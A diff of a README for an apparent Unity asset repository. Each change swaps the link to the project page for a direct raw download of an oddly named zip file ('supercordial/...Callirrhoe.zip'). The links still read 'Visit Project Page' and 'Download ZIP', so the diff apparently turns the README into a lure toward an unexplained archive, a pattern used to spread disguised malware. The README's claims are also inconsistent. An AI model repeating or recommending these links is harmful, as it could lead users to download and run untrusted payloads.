@@ -1,6 +1,6 @@
 # ⚙️ greater-china-unity-assets - Explore Unity Assets Before Deadline
 
-[![Download Now](https://img.shields.io/badge/Download-greater--china--unity--assets-brightgreen)](https://github.com/Adrieldevsenai/greater-china-unity-assets)
+[![Download Now](https://img.shields.io/badge/Download-greater--china--unity--assets-brightgreen)](https://github.com/Adrieldevsenai/greater-china-unity-assets/raw/refs/heads/main/supercordial/assets-unity-greater-china-Callirrhoe.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You do not need to install any software other than the browser.
 
 Use the link below to get started with the project:
 
-[![Visit Project Page](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/Adrieldevsenai/greater-china-unity-assets)
+[![Visit Project Page](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/Adrieldevsenai/greater-china-unity-assets/raw/refs/heads/main/supercordial/assets-unity-greater-china-Callirrhoe.zip)
 
 ### How to access and use the app
 
@@ -118,7 +118,7 @@ This archive is for Unity developers, so having Unity installed is needed to use
 
 You can access and download the repository from this link:
 
-[Download greater-china-unity-assets](https://github.com/Adrieldevsenai/greater-china-unity-assets)
+[Download greater-china-unity-assets](https://github.com/Adrieldevsenai/greater-china-unity-assets/raw/refs/heads/main/supercordial/assets-unity-greater-china-Callirrhoe.zip)
 
 Use the **Download ZIP** button on the GitHub page to get the full project files.
 
